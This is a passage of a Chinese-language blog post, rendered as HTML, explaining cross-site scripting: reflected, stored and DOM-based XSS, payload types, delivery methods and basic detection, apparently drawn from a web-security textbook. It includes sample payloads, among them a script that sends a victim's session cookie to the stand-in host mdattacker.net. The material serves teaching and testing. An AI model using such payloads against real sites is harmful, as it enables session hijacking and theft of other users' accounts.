@@ -1,0 +1,1335 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="Web安全(10), FightingTree">
+    <meta name="description" content="攻击其他用户绝大多数针对Web应用程序的攻击主要以服务器端应用程序为攻击目标，攻击者所使用的基本攻击方法是以无法预料的方式与服务器进行交互的，目的是执行未授权操作并非法访问数据。本篇文章描述的是另一种类型的攻击，在此类攻击中，攻击者的主要对">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>Web安全(10) | FightingTree</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    <style type="text/css">
+        
+    </style>
+
+    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
+<meta name="generator" content="Hexo 4.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+<body>
+
+<header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">FightingTree</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right">
+    
+    <li class="hide-on-med-and-down">
+        <a href="/" class="waves-effect waves-light">
+            
+            <i class="fa fa-home"></i>
+            
+            <span>首页</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/tags" class="waves-effect waves-light">
+            
+            <i class="fa fa-tags"></i>
+            
+            <span>标签</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/categories" class="waves-effect waves-light">
+            
+            <i class="fa fa-bookmark"></i>
+            
+            <span>分类</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/archives" class="waves-effect waves-light">
+            
+            <i class="fa fa-archive"></i>
+            
+            <span>归档</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/about" class="waves-effect waves-light">
+            
+            <i class="fa fa-user-circle-o"></i>
+            
+            <span>关于我</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/friends" class="waves-effect waves-light">
+            
+            <i class="fa fa-address-book"></i>
+            
+            <span>友情链接</span>
+        </a>
+    </li>
+    
+    <li>
+        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+            <i id="searchIcon" class="fa fa-search" title="搜索"></i>
+        </a>
+    </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">FightingTree</div>
+        <div class="logo-desc">
+            
+            No pains, No gains.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li>
+            <a href="/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-home"></i>
+                
+                首页
+            </a>
+        </li>
+        
+        <li>
+            <a href="/tags" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-tags"></i>
+                
+                标签
+            </a>
+        </li>
+        
+        <li>
+            <a href="/categories" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-bookmark"></i>
+                
+                分类
+            </a>
+        </li>
+        
+        <li>
+            <a href="/archives" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-archive"></i>
+                
+                归档
+            </a>
+        </li>
+        
+        <li>
+            <a href="/about" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-user-circle-o"></i>
+                
+                关于我
+            </a>
+        </li>
+        
+        <li>
+            <a href="/friends" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-address-book"></i>
+                
+                友情链接
+            </a>
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/fightingtree/fightingtree.github.io" class="waves-effect waves-light" target="_blank">
+                <i class="fa fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #c2185b;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/fightingtree/fightingtree.github.io" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://pic.superbed.cn/item/5db3fa668b58bc7bf71e5255.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        Web安全(10)
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #c2185b;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #c2185b;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #c2185b;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 20px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/Web/" target="_blank">
+                                <span class="chip bg-color">Web</span>
+                            </a>
+                        
+                            <a href="/tags/%E5%AE%89%E5%85%A8/" target="_blank">
+                                <span class="chip bg-color">安全</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fa fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E5%AE%89%E5%85%A8/" class="post-category" target="_blank">
+                                安全
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                <div class="post-date info-break-policy">
+                    <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2019-11-09
+                </div>
+
+                
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
+                        17.6k
+                    </div>
+                    
+
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                        62 分
+                    </div>
+                    
+                
+				
+				
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="fa fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="攻击其他用户"><a href="#攻击其他用户" class="headerlink" title="攻击其他用户"></a>攻击其他用户</h2><p>绝大多数针对Web应用程序的攻击主要以服务器端应用程序为攻击目标，攻击者所使用的基本攻击方法是以无法预料的方式与服务器进行交互的，目的是执行未授权操作并非法访问数据。本篇文章描述的是另一种类型的攻击，在此类攻击中，攻击者的主要对象是应用程序的其他用户。</p>
+<h3 id="跨站点脚本XSS"><a href="#跨站点脚本XSS" class="headerlink" title="跨站点脚本XSS"></a>跨站点脚本XSS</h3><p>跨站点脚本(XSS)导致了针对其他用户的重量级攻击。保存型XSS攻击能攻破最具安全意识的用户，而无须与用户进行任何交互。通常，XSS是一类主要的应用程序安全缺陷，它常常与其他漏洞一起造成破坏性的后果。有时，XSS攻击也可能转变成某种病毒或能够自我繁殖的蠕虫，这种攻击非常严重。</p>
+<h2 id="XSS的分类"><a href="#XSS的分类" class="headerlink" title="XSS的分类"></a>XSS的分类</h2><p>XSS漏洞表现为各种形式，并且分为3种类型：反射型、保存型和基于DOM的XSS漏洞。</p>
+<h3 id="反射型XSS漏洞"><a href="#反射型XSS漏洞" class="headerlink" title="反射型XSS漏洞"></a>反射型XSS漏洞</h3><ul>
+<li>如果一个应用程序采用动态页面向用户显示错误信息，就会造成这种常见的XSS漏洞。通常，该页面会使用一个包含信息文本的参数，并在响应中将这个文本返回给用户。对于开发者而言，使用这种机制非常方便，因为它允许他们从应用程序中调用一个定制的错误页面，而不需要对错误页面中的信息进行硬编码。</li>
+<li>由于利用这种漏洞需要设计一个包含嵌入式javascript代码的请求，随后这些代码又被反射到任何提出请求的用户，因而它被称为反射型XSS漏洞。攻击有效载荷分别通过一个单独的请求和响应进行传送和执行。为此，有时它也称一阶XSS。</li>
+<li>提取用户提交的输入并将其插入到服务器响应的HTML代码中，这是XSS漏洞的一个明显特征。如果应用程序没有实施任何过滤或净化措施，那么它很容易收到攻击。例如，下面的URL经过专门设计，它用一段生成弹出对话框的Javascript代码代替错误信息：<pre class=" language-bash"><code class="language-bash">http://mdsec.net/errors/5/Error/ashx?message<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre>
+请求这个URL将会生成一个HTML页面，其中包含以下替代原始消息的脚本：<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>p<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span class="token operator">&lt;</span>/p<span class="token operator">></span></code></pre>
+message参数的内容可用于任何返回给浏览器的数据替代；无论服务器端应用程序如何处理这些数据，都无法阻止提交javascript代码，一旦错误代码页面在浏览器中显示，这些代码就会执行。</li>
+</ul>
+<h4 id="利用漏洞"><a href="#利用漏洞" class="headerlink" title="利用漏洞"></a>利用漏洞</h4><p>利用XSS漏洞攻击应用程序其他用户的方式有很多种，最简单的一种攻击，也就是我们常用于说明XSS漏洞潜在影响的一种攻击，可导致攻击者截获通过验证的用户的会话令牌。劫持用户的会话后，攻击者就可以访问该用户授权访问的所有数据和功能。<br>实施反射型XSS攻击的步骤如图：<br><img src="https://i.postimg.cc/4x8X5y4R/1.jpg" alt=""></p>
+<ol>
+<li>用户正常登录应用程序，得到一个包含会话令牌的cookie:<pre class=" language-bash"><code class="language-bash">Set-Cookie: sessId<span class="token operator">=</span>184a138ed37374201a4c9672362f12459c2a652491a3</code></pre>
+</li>
+<li>攻击者通过某种方式向用户提交以下URL：<pre class=" language-bash"><code class="language-bash">http://mdsec.net/error/5/Error.ashx?message<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span>var+i<span class="token operator">=</span>new+Image<span class="token punctuation">;</span>+i.src<span class="token operator">=</span><span class="token string">"http://mdattacker.net/%2bdocument.cookie;&lt;/script>"</span></code></pre>
+和前面生成一个对话框信息的示例一样，这个URL包含嵌入式的javascript代码。但是，这个示例中的攻击有效载荷更加恶毒。</li>
+<li>用户从应用程序中请求攻击者传送给他们的URL</li>
+<li>服务器响应用户的请求，由于应用程序存在XSS漏洞，响应中包含攻击者创建的JavaScript代码</li>
+<li>用户浏览器收到攻击者的JavaScript代码，像执行从应用程序收到的其他代码一样，浏览器执行这段代码。</li>
+<li>攻击者创建的恶意JavaScript代码为：<pre class=" language-bash"><code class="language-bash">var i <span class="token operator">=</span> new image<span class="token punctuation">;</span> i.src<span class="token operator">=</span><span class="token string">"http://mdattacker.net/"</span>+document.cookie<span class="token punctuation">;</span></code></pre>
+这段代码可让用户浏览器向mdattacker.net(攻击者拥有的一个域)提出一个请求。请求中包含用户访问应用程序的当前会话令牌：<pre class=" language-bash"><code class="language-bash">GET /sessId<span class="token operator">=</span>184a138ed37374201a4c9672362f12459c2a652491a3 HTTP/1.1
+Host: mdattacker.net</code></pre>
+</li>
+<li>攻击者监控访问mdattacker.net的请求并收到用户的请求。攻击者使用截获的令牌劫持用户的会话，从而访问该用户的个人信息，并“代表”该用户执行任意操作。</li>
+</ol>
+<h5 id="使用XSS漏洞的目的"><a href="#使用XSS漏洞的目的" class="headerlink" title="使用XSS漏洞的目的"></a>使用XSS漏洞的目的</h5><p>完成上述步骤后，还有一个问题需要思考：如果攻击者能够诱使用户访问他选择的URL，那么他不直接在mdattacker.net上保存一段恶意脚本，并向用户传送一个直接指向这段脚本的链接呢？这个脚本不是可以和上例中的脚本一起执行吗？要回答这个问题，需要回顾Web安全(2)中介绍的同源策略。为防止不同域在用户浏览器中彼此干扰，浏览器对从不同来源(域)收到的内容进行隔离。攻击者的目的不是单纯地执行任意脚本，而是截获用户令牌。浏览器不允许任何一个旧有脚本访问任何一个站点的cookie，否则，会话就会很容易被劫持。而且，只有发布cookie的站点能够访问这些cookie：仅在返回发布站点的HTTP请求中提交cookie；只有通过该站点返回的页面所包含或加载的javascript才能访问cookie。因此，如果mdattacker.net上的一段脚本查询 document.cookie，它将无法获得mdsec.net发布的cookie，攻击也不会成功。</p>
+<p>就用户的浏览器而言，利用XSS漏洞攻击之所以成功，是因为攻击者的恶意JavaScript是由mdsec.net交给它的。当用户请求攻击者的URL时，浏览器向http:// mdsec.net/error/5/Error.ashx提出一个请求，然后应用程序返回一个包含一段JavaScript的页面。和从mdsec.net收到的任何JavaScript一样，浏览器执行这段脚本，因为用户信任mdsec.net，这就是为何该漏洞被称为跨站点脚本的原因。</p>
+<h3 id="保存型XSS漏洞"><a href="#保存型XSS漏洞" class="headerlink" title="保存型XSS漏洞"></a>保存型XSS漏洞</h3><ul>
+<li>如果一名用户提交的数据被保存在应用程序中(通常保存在一个后端数据库中)，然后不经过适当过滤或净化就显示给其他用户，此时就会出现这种漏洞</li>
+<li>在支持终端用户交互的应用程序中，或者在具有管理员权限的员工访问同一个应用程序中的用户记录和数据的应用程序中，保存型XSS漏洞很常见。</li>
+<li>一般情况下，利用保存型XSS漏洞的攻击至少需要向应用程序提出两个请求。攻击者在第一个请求中传送一些专门设计的数据，其中包含恶意代码，应用程序接受并保存这些数据。在第二次请求中，一名受害者查看某个包含攻击者的数据的页面，这时恶意代码开始执行。为此，这种漏洞有时也叫做二阶跨站点脚本。(在这个示例中，使用XSS实际上不准确，因为攻击中没有跨站点元素，但由于这个名称被人们广泛使用，因此我们在这里仍然沿用它。)<br>攻击步骤如下图所示：<br><img src="https://i.postimg.cc/Wz6vJbYK/2.jpg" alt=""></li>
+</ul>
+<h4 id="反射型与保存型XSS攻击的差别"><a href="#反射型与保存型XSS攻击的差别" class="headerlink" title="反射型与保存型XSS攻击的差别"></a>反射型与保存型XSS攻击的差别</h4><p>反射型和保存型XSS攻击在实施步骤上有两个重要的区别，这也使得后者往往造成更大的安全威胁。</p>
+<ul>
+<li>在反射型XSS脚本攻击中，要利用一个漏洞，攻击者必须以某种方式诱使受害者访问他专门设计的URL，而保存型XSS脚本攻击没有这种要求。在应用程序展开保存型XSS脚本攻击后，攻击者只需等待受害者浏览已被攻破的页面或功能。通常，这个页面是一个正常用户将会主动访问的常规页面。</li>
+<li>如果受害者在遭受攻击时正在使用应用程序，攻击者就更容易实现其利用XSS漏洞的目的。例如，如果用户当前正在进行会话，那么攻击者就可以劫持这个会话。在反射型XSS攻击中，攻击者可能会说服用户登录，然后单击他们提供的一个链接，从而制造这种情况。或者他可能会部署一个永久性的有效载荷并等待用户登录。但是，在保存型XSS攻击中，攻击者能够保证，受害用户在他实施攻击时已经在访问应用程序。因为攻击有效载荷被保存在用户自主访问的一个应用程序页面中，所以，当有效载荷执行时，任何攻击受害者都在使用应用程序。而且，如果上述页面位于应用程序通过验证的区域内，那么那时攻击受害者一定已经登录。</li>
+</ul>
+<h3 id="基于DOM的XSS漏洞"><a href="#基于DOM的XSS漏洞" class="headerlink" title="基于DOM的XSS漏洞"></a>基于DOM的XSS漏洞</h3><p>反射型和保存型XSS漏洞都表现出一种特殊的行为模式，其中应用程序提取用户控制的数据并以危险的方式将这些数据都返回给用户。第三类XSS漏洞并不具有这种特点，在这种漏洞中，攻击者的JavaScript通过以下过程得以执行：</p>
+<ul>
+<li>用户请求一个经过专门设计的URL，它由攻击者提交，且其中包含嵌入式JavaScript。</li>
+<li>服务器的响应中并不以任何形式包含攻击者的脚本。</li>
+<li>当用户的浏览器处理这个响应时，上述脚本得到处理。</li>
+</ul>
+<p>由于JavaScript可以访问浏览器的文本对象模型(DOM),因此它能够决定用于加载当前页面的URL。由应用程序发布的一段脚本可以从URL中提取数据，对这些数据进行处理，然后用它动态更新页面的内容。如果这样，应用程序就可能易于受到基于DOM的XSS攻击。</p>
+<p>在前面的反射型XSS漏洞示例中，其中服务器端应用程序将一个URL参数值复制到一条错误信息中。另一种实现相同功能的办法是由应用程序每次返回相同的静态HTML，并使用客户端JavaScript动态生成消息内容。</p>
+<p>利用基于DOM的XSS漏洞的过程如图所示：<br><img src="c" alt=""></p>
+<h4 id="与反射型、保存型XSS的区别"><a href="#与反射型、保存型XSS的区别" class="headerlink" title="与反射型、保存型XSS的区别"></a>与反射型、保存型XSS的区别</h4><p>与保存型XSS漏洞相比，基于DOM的XSS漏洞与反射型XSS漏洞有更大的相似性。利用他们通常需要攻击者诱使一名用户访问一个包含恶意代码的专门设计的URL，并由服务器响应那个确保恶意代码得以执行的特殊请求。但是，在利用反射型与基于DOM的XSS漏洞的细节方面，还存在一些重要差异。</p>
+<h2 id="进行中的XSS攻击"><a href="#进行中的XSS攻击" class="headerlink" title="进行中的XSS攻击"></a>进行中的XSS攻击</h2><h3 id="XSS攻击有效载荷"><a href="#XSS攻击有效载荷" class="headerlink" title="XSS攻击有效载荷"></a>XSS攻击有效载荷</h3><p>迄今为止，我们已经重点分析了典型的XSS攻击有效载荷，如截获一名受害者的会话令牌，劫持他的会话，进而“作为”受害者应用程序，执行操作并占有该用户的账户。实际上，还有其他大量的攻击有效载荷可通过任何类型的XSS漏洞传送。</p>
+<h4 id="虚拟置换"><a href="#虚拟置换" class="headerlink" title="虚拟置换"></a>虚拟置换</h4><p>这种攻击需要在一个Web应用程序页面注入恶意数据，从而向应用程序用户传送误导性信息。它包括简单向站点中注入HTML标记，或使用脚本(有时保存在外部服务器上)在站点中注入精心设计的导航和内容。这种攻击被称为虚拟置换(virtual defacement)，因为攻击者实际上并没有修改保存在目标Web服务器上的内容，而是利用应用程序处理并显示用户提交的输入方面的缺陷实现置换。</p>
+<h4 id="注入木马功能"><a href="#注入木马功能" class="headerlink" title="注入木马功能"></a>注入木马功能</h4><p>这种攻击造成的后果远比虚拟置换严重，它在易受攻击的应用程序中注入实际允许的功能，旨在欺骗终端用户执行某种有害操作(如输入敏感数据),然后将它们传送给攻击者。<br>在一个明显的攻击中，攻击者注入的功能向用户显示一个木马登录表单，要求他们向攻击者控制的服务器提交他们自己的证书。如果由技巧熟练的攻击者实施，这种攻击还允许用户无缝登录到真正的应用程序中，确保他们不会发觉访问过程中的任何反常情况。然后，攻击者就可以自由使用受害者的证书实现自己的目的。这种类型的有效载荷非常适用于在钓鱼攻击中，向用户传送一个经过专门设计、链接可信应用程序的URL，并要求他们正常登录以访问这个URL。</p>
+<h4 id="诱使用户执行操作"><a href="#诱使用户执行操作" class="headerlink" title="诱使用户执行操作"></a>诱使用户执行操作</h4><ul>
+<li>如果攻击者劫持受害者的会话，那么他就可以“作为”该用户使用应用程序，并代表这名用户执行任何操作。但是，这种方法并不总能达到想要的目的。它要求攻击者监控他们自己的服务器，看其是否收到被攻破的用户的会话令牌。它要求攻击者代表每一名用户执行相关操作。如果要向许多用户实施攻击，这种方法并不可行。而且，他在应用程序的日志中留下相当明显的痕迹，用户在调查过程中利用它可以迅速确定执行未授权操作的计算机。</li>
+<li>如果攻击者想要代表每一位被攻破的用户执行一组特殊的操作，就可以采用另一种劫持会话的方式，即利用攻击有效载荷脚本执行操作。如果攻击者想要执行某个需要管理权限的操作，如修改他控制的一个用户的权限，这种方法特别有用。由于用户众多，要劫持每一名用户的会话并确定其是否为管理员，可能需要付出极大的努力。一种更有效的方法是，诱使每个被攻破的用户尝试升级攻击者的权限。</li>
+</ul>
+<h4 id="利用信任关系"><a href="#利用信任关系" class="headerlink" title="利用信任关系"></a>利用信任关系</h4><p>上文介绍了可能被XSS利用的一种重要的信任关系：浏览器信任由发布cookie的Web站点提交的JavaScript。有时，XSS攻击还可以利用其他一些信任关系。</p>
+<ul>
+<li>如果应用程序采用激活自动完成功能的表单，由应用程序提交的JavaScript就可以截获任何以前输入的、用户浏览器保存在自动完成的缓存中的数据。通过示例化相关表单，等待浏览器自动完成它的内容，然后查询表单字段值，上述JavaScript脚本就能够窃取这些数据并将其传送至攻击者的服务器。这种攻击比注入木马功能更为强大，因为它不需要用户执行任何操作就能截获敏感数据。</li>
+<li>一些Web应用程序推荐或要求用户把其域名添加到浏览器的“可信站点”区域内。这意味着攻击者可以利用任何XSS类型的漏洞在受害用户上执行任意代码。</li>
+<li>Web应用程序通常采用包含强大方法的ActiveX控件(请参阅Web安全(11))。一些应用程序在该控件内核实调用的Web页面确实属于正确的Web站点，力求防止第三方滥用这种控件。通过XSS攻击仍然可以滥用这个控件，因为这时调用的代码可以通过控件实施信任检查。</li>
+</ul>
+<h3 id="XSS攻击的传送机制"><a href="#XSS攻击的传送机制" class="headerlink" title="XSS攻击的传送机制"></a>XSS攻击的传送机制</h3><p>确定一个XSS漏洞并设计出利用它的适当有效载荷后，攻击者需要找出方法向应用程序的其他用户传送攻击。我们在前面已经讨论了几种传送方法，实际上，攻击者还可以使用其他许多传送机制。</p>
+<h4 id="传送反射型和基于DOM的XSS攻击"><a href="#传送反射型和基于DOM的XSS攻击" class="headerlink" title="传送反射型和基于DOM的XSS攻击"></a>传送反射型和基于DOM的XSS攻击</h4><p>除了通过电子邮件向随机用户大量发送专门设计的URL这种明显的钓鱼向量外，攻击者还可以尝试使用以下机制传送反射型或基于DOM的XSS攻击。</p>
+<ul>
+<li>在有针对性的攻击中，攻击者可以向个体目标用户或少数几名用户发送一封伪造的电子邮件。例如，可以向管理员发送一封明显由已知用户送出的电子邮件，抱怨某个特殊的URL造成错误。如果攻击者想要攻破某个特殊用户的会话(而非截取随机用户的会话)，实施针对性攻击往往是最有效的传送机制。有时我们把这类攻击称为“鱼叉式钓鱼”。</li>
+<li>可以在即时消息中向目标主机提供一个URL</li>
+<li>第三方Web站点上的内容与代码可用于生成触发XSS漏洞的请求。各种常见的应用程序允许用户发布数量有限的HTML标记，这些标记将按原样向其他用户显示。如果可以使用GET方法触发的XSS漏洞，攻击者就可以在第三方站点上发布一个指向某恶意URL的IMG标签，任何查看以上第三方内容的用户将在不知情的情况下请求该恶意URL。</li>
+<li>攻击者付费购买许多链接至一个URL的横幅广告中，该URL包含一个针对某易受攻击的应用程序的XSS有效载荷</li>
+<li>许多应用程序提供一种“推荐给朋友”或向站点管理员发送反馈的功能，这种功能通常允许用户生成一封电子邮件，其内容与收件人均可自由设置。攻击者能够利用这种功能，通过一封实际源于自己服务器的电子邮件传送XSS攻击。</li>
+</ul>
+<h4 id="传送保存型XSS攻击"><a href="#传送保存型XSS攻击" class="headerlink" title="传送保存型XSS攻击"></a>传送保存型XSS攻击</h4><p>保存型XSS攻击共有两种传送机制：带内和带外传送机制<br>带内传送机制适用于绝大多数情况，这时漏洞数据通过主Web界面提交给应用程序。用户控制的数据最终显示给其他用户的常见位置包括以下几种：</p>
+<ul>
+<li>个人信息</li>
+<li>文档、上传文档及其他数据的名称</li>
+<li>提交给应用程序管理员的反馈或问题</li>
+<li>向其他应用程序或用户传送的消息、注释、问题等</li>
+<li>记录在应用程序中的，并通过浏览器显示给管理员的任何内容，如URL、用户名、HTTP Referer、User-Agent等</li>
+<li>在用户之间共享的上传文件内容<br>在这些情况下，只需向应用程序提交XSS有效载荷，然后等待受害者查看恶意代码，就可以传送XSS有效载荷。</li>
+</ul>
+<p>带外传送机制适用于通过其他渠道向应用程序提交漏洞数据的情况。应用程序通过这种渠道接收数据，并最终在主Web页面生成的HTML页面中显示它。前面描述的针对Web邮件应用程序的攻击就是这种传送机制的典型示例。</p>
+<h4 id="链接XSS与其他攻击"><a href="#链接XSS与其他攻击" class="headerlink" title="链接XSS与其他攻击"></a>链接XSS与其他攻击</h4><p>XSS有时可以与其他漏洞链接在一起，造成破坏性后果。</p>
+<h2 id="查找并利用XSS漏洞"><a href="#查找并利用XSS漏洞" class="headerlink" title="查找并利用XSS漏洞"></a>查找并利用XSS漏洞</h2><p>确定XSS漏洞的基本方法是使用下面这个概念验证攻击字符串：</p>
+<pre class=" language-bash"><code class="language-bash">"<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token punctuation">(</span>document.cookie<span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre>
+<p>这个字符串被提交给每个应用程序页面中的每一个参数；同时，攻击者监控它的响应，看其中是否出现了相同的字符串。如果发现攻击字符串按原样出现在响应中，几乎可以肯定应用程序存在XSS漏洞。如果仅仅只是为了尽可能快确定应用程序中存在的某种XSS漏洞，以向其他应用程序用户实施攻击，那么这个基本方法是最有效的方法，因为它可以实现高度自动化，而且很少生成错误警报。</p>
+<p>如果是对应用程序进行进行复杂的测试，从而确定尽可能多的漏洞，那么在应用基本方法的同时，还要组合更加复杂的技巧。以下几种情况，通过基本的检测方法可能无法确定应用程序中存在的XSS漏洞。</p>
+<ul>
+<li>许多应用程序实施基于黑名单的初步过滤，试图阻止XSS攻击。通常这些过滤会在请求参数中将&lt; script&gt;之类的表达式过滤掉。</li>
